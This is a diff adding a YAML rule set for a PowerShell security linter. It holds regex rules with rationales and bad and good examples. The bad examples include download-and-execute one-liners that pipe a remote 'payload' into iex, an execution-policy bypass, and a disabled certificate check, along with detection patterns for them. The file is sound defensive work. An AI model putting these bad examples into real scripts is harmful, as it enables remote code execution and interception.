@@ -1,0 +1,199 @@
+category: PowerShell - Security
+technology: powershell
+description: >
+  Security rules for Windows PowerShell scripts (.ps1).
+  Covers credential handling, execution policy bypass, injection risks,
+  TLS enforcement, and insecure patterns.
+rules:
+
+  - id: PS-SEC-001
+    name: No hardcoded passwords or credentials
+    severity: critical
+    description: "Passwords, API keys, secrets, and credentials must never be hardcoded as plain strings. Use SecureString, Get-Secret (SecretManagement module), or environment variables."
+    rationale: "Hardcoded credentials are exposed to anyone who can read the script file, view source control history, or intercept logging output. Credential theft is the leading cause of infrastructure breaches."
+    match_type: regex
+    target: any
+    pattern: "(Password|Passwd|Secret|ApiKey|Token|AccessKey|ConnectionString)\\s*=\\s*['\"][A-Za-z0-9+/!@#$%^&*]{6,}['\"]"
+    flags: IGNORECASE
+    exclude_pattern: "#|SecureString|ConvertTo-SecureString|\\$env:|Get-Secret|\\$_\\.Password|param"
+    example_bad: |
+      $Password = "MyS3cr3tPass!"
+      $ApiKey = "sk-proj-abc123xyz789"
+    example_good: |
+      $Password = Get-Secret -Name 'AppDbPassword' -AsPlainText
+      $ApiKey   = $env:APP_API_KEY
+
+  - id: PS-SEC-002
+    name: Do not use ConvertTo-SecureString with plain text AsPlainText
+    severity: error
+    description: "Do not use ConvertTo-SecureString -AsPlainText -Force with a hardcoded string. This converts a visible plaintext credential into a SecureString but the plaintext is still visible in the script."
+    rationale: "ConvertTo-SecureString -AsPlainText only protects the credential in memory; the source string is still hardcoded and visible. Retrieve the credential from a secret store instead."
+    match_type: regex
+    target: any
+    pattern: "ConvertTo-SecureString\\s+['\"][^'\"$]{4,}['\"]\\s+-AsPlainText"
+    exclude_pattern: "#"
+    example_bad: |
+      $SecurePass = ConvertTo-SecureString "MyP@ssword!" -AsPlainText -Force
+    example_good: |
+      $SecurePass = Get-Secret -Name 'ServiceAccountPassword'
+
+  - id: PS-SEC-003
+    name: Do not bypass execution policy
+    severity: critical
+    description: "Scripts must not use -ExecutionPolicy Bypass or Set-ExecutionPolicy Bypass/Unrestricted. Use proper code signing instead."
+    rationale: "Bypassing execution policy removes the OS-level protection against running unsigned or untrusted scripts. In production environments, scripts should be signed with a trusted certificate, not have policy bypassed."
+    match_type: regex
+    target: any
+    pattern: "-ExecutionPolicy\\s+(Bypass|Unrestricted)|Set-ExecutionPolicy\\s+(Bypass|Unrestricted)"
+    flags: IGNORECASE
+    exclude_pattern: "#"
+    example_bad: |
+      powershell.exe -ExecutionPolicy Bypass -File deploy.ps1
+      Set-ExecutionPolicy Bypass -Scope Process -Force
+    example_good: |
+      # Scripts should be signed:
+      # Set-AuthenticodeSignature -FilePath deploy.ps1 -Certificate $cert
+
+  - id: PS-SEC-004
+    name: Enforce TLS 1.2 or higher for web requests
+    severity: error
+    description: "Scripts making web requests must explicitly set [Net.ServicePointManager]::SecurityProtocol to Tls12 or Tls13 before web calls."
+    rationale: "PowerShell 5.1 defaults to TLS 1.0, which has known vulnerabilities. Failing to set the minimum protocol version means connections may negotiate a weak protocol, exposing data in transit."
+    match_type: regex
+    target: any
+    pattern: "(Invoke-RestMethod|Invoke-WebRequest|Net\\.WebClient)"
+    require_nearby_in_file: "SecurityProtocol.*Tls12|SecurityProtocol.*Tls13|\\[Net\\.SecurityProtocolType\\]::Tls12"
+    example_bad: |
+      $Response = Invoke-RestMethod -Uri $ApiUrl -Method Get
+    example_good: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $Response = Invoke-RestMethod -Uri $ApiUrl -Method Get
+
+  - id: PS-SEC-005
+    name: Do not use Invoke-Expression with external or user input
+    severity: critical
+    description: "Invoke-Expression (iex) must not be used with any string that includes variable content from external sources, user input, or network responses."
+    rationale: "Invoke-Expression executes an arbitrary string as PowerShell code — it is the PowerShell equivalent of eval. If any part of the string is attacker-controlled, it results in arbitrary code execution."
+    match_type: regex
+    target: any
+    pattern: "Invoke-Expression\\s+\\$|iex\\s+\\$|Invoke-Expression\\s+\\(.*\\$"
+    exclude_pattern: "#"
+    example_bad: |
+      Invoke-Expression $UserInput
+      iex (New-Object Net.WebClient).DownloadString('http://example.com/payload')
+    example_good: |
+      # Use specific cmdlets instead of constructing dynamic commands
+      & $ScriptPath -Parameter $Value
+
+  - id: PS-SEC-006
+    name: Do not download and execute from the internet
+    severity: critical
+    description: "Do not download and immediately execute scripts or binaries from the internet using DownloadString, IEX, or piped execution patterns."
+    rationale: "Downloading and immediately executing code from the internet gives no opportunity to verify the content. This pattern is used in almost all PowerShell-based malware. Always download, verify hash, then execute."
+    match_type: regex
+    target: any
+    pattern: "(DownloadString|DownloadFile).*http|Net\\.WebClient.*iex|Invoke-Expression.*Invoke-WebRequest"
+    flags: IGNORECASE
+    exclude_pattern: "#"
+    example_bad: |
+      iex (New-Object Net.WebClient).DownloadString('https://get.example.com/install.ps1')
+    example_good: |
+      Invoke-WebRequest -Uri 'https://get.example.com/install.ps1' -OutFile 'C:\Temp\install.ps1'
+      $hash = Get-FileHash 'C:\Temp\install.ps1' -Algorithm SHA256
+      if ($hash.Hash -ne $expectedHash) { throw "Hash mismatch — aborting" }
+      & 'C:\Temp\install.ps1'
+
+  - id: PS-SEC-007
+    name: Use PSCredential for credential handling, not plain strings
+    severity: error
+    description: "Credentials passed to cmdlets must use [PSCredential] objects, not plain username/password string pairs."
+    rationale: "Plain string credentials are stored in memory as readable strings and may appear in logging output. PSCredential stores the password as a SecureString, limiting exposure in memory and log files."
+    match_type: regex
+    target: any
+    pattern: "-Username\\s+['\"].*['\"]\\s+-Password\\s+['\"]"
+    flags: IGNORECASE
+    exclude_pattern: "#"
+    example_bad: |
+      Connect-Server -Username "admin" -Password "MyPass123"
+    example_good: |
+      $Cred = Get-Credential
+      Connect-Server -Credential $Cred
+
+  - id: PS-SEC-008
+    name: Do not disable SSL certificate validation
+    severity: critical
+    description: "Scripts must not disable SSL certificate validation via [Net.ServicePointManager]::ServerCertificateValidationCallback or -SkipCertificateCheck."
+    rationale: "Disabling certificate validation defeats TLS entirely, making all 'encrypted' connections trivially interceptable by anyone on the network path. This is a common shortcut that creates critical security vulnerabilities."
+    match_type: regex
+    target: any
+    pattern: "ServerCertificateValidationCallback\\s*=\\s*\\{.*\\$true|ServerCertificateValidationCallback\\s*=\\s*\\{\\s*\\}|-SkipCertificateCheck"
+    flags: IGNORECASE
+    exclude_pattern: "#"
+    example_bad: |
+      [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+      Invoke-WebRequest -Uri $Url -SkipCertificateCheck
+    example_good: |
+      # Fix the certificate issue rather than disabling validation
+      # Add the CA cert to the trusted store:
+      Import-Certificate -FilePath .\internal-ca.crt -CertStoreLocation Cert:\LocalMachine\Root
+
+  - id: PS-SEC-009
+    name: Sensitive data must not be written to verbose or debug output
+    severity: error
+    description: "Passwords, tokens, keys, and secrets must not be passed to Write-Verbose, Write-Debug, or Write-Host where they would appear in logs."
+    rationale: "Verbose and debug output is often captured in CI/CD logs, SIEM systems, and audit logs. Credentials appearing there are effectively exposed to anyone with log access — often a much larger audience than intended."
+    match_type: regex
+    target: any
+    pattern: "(Write-Verbose|Write-Debug|Write-Host).*\\$(Password|Token|Secret|ApiKey|Key|Credential)"
+    flags: IGNORECASE
+    exclude_pattern: "#"
+    example_bad: |
+      Write-Verbose "Connecting with password: $Password"
+      Write-Debug "API Token: $ApiToken"
+    example_good: |
+      Write-Verbose "Connecting to $Server as $Username"
+      # Never log the credential value itself
+
+  - id: PS-SEC-010
+    name: Use -WhatIf for destructive operations in scripts
+    severity: warning
+    description: "Functions that perform destructive operations (Remove-Item, Stop-Service, Format-Volume) should support -WhatIf via SupportsShouldProcess."
+    rationale: "SupportsShouldProcess enables -WhatIf mode, letting operators preview destructive changes before executing them. This is a critical safety feature for scripts run in production environments."
+    match_type: regex
+    target: any
+    pattern: "(Remove-Item|Remove-ADUser|Stop-Service|Format-Volume|Clear-Content)\\s+"
+    require_nearby: "SupportsShouldProcess"
+    exclude_pattern: "#"
+    example_bad: |
+      function Remove-StaleAccounts {
+          [CmdletBinding()]
+          param([string[]]$Users)
+          foreach ($user in $Users) {
+              Remove-ADUser -Identity $user -Confirm:$false
+          }
+      }
+    example_good: |
+      function Remove-StaleAccounts {
+          [CmdletBinding(SupportsShouldProcess=$true)]
+          param([string[]]$Users)
+          foreach ($user in $Users) {
+              if ($PSCmdlet.ShouldProcess($user, 'Remove AD User')) {
+                  Remove-ADUser -Identity $user -Confirm:$false
+              }
+          }
+      }
+
+  - id: PS-SEC-011
+    name: Do not use plain HTTP for web requests
+    severity: error
+    description: "All web requests must use HTTPS. Plain HTTP transmits data in cleartext and must not be used for any API calls or file downloads."
+    rationale: "HTTP provides no encryption. Credentials, tokens, and data sent over HTTP are visible to anyone on the network path. All endpoints should be accessed via HTTPS only."
+    match_type: regex
+    target: any
+    pattern: "(Invoke-RestMethod|Invoke-WebRequest|Net\\.WebClient).*['\"]http://"
+    flags: IGNORECASE
+    exclude_pattern: "#|localhost|127\\.0\\.0\\.1"
+    example_bad: |
+      Invoke-RestMethod -Uri "http://api.example.com/deploy" -Method Post
+    example_good: |
+      Invoke-RestMethod -Uri "https://api.example.com/deploy" -Method Post
